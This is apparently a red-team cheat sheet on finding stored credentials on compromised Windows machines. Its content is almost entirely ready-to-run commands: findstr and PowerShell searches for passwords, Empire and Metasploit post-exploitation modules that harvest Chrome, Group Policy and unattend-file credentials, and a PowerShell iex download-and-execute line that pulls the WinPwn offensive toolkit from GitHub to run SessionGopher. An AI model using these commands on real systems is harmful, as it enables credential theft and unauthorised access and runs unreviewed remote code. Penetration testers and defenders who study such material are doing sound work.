# Credentials in files

### 1) Cmd

#### Running these commands in the root of c:\ can produce enourmouse output.

    findstr /si pass *.xml *.doc *.txt *.xls
    findstr /si cred *.xml *.doc *.txt *.xls

### 2) Empire C2

    powershell/collection/file_finder
    powershell/collection/find_interesting_file
    powershell/credentials/sessiongopher

### 3) Metasploit

#####  Meterpreter

#### Search by file name from parent directory

    search -d <Directory> -f <File>
    search -d c:\\shares -f *password*

#### Modules

    use post/windows/gather/enum_unattend
    use post/windows/gather/credentials/chrome
    use post/windows/gather/credentials/gpp
    use post/windows/gather/enum_files

# Search all modules

    search post/windows/gather/credentials

### 4) Powershell

    ls -R | select-string -Pattern password

### 5) SessionGopher

    $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
    sessionGopher -noninteractive -consoleoutput
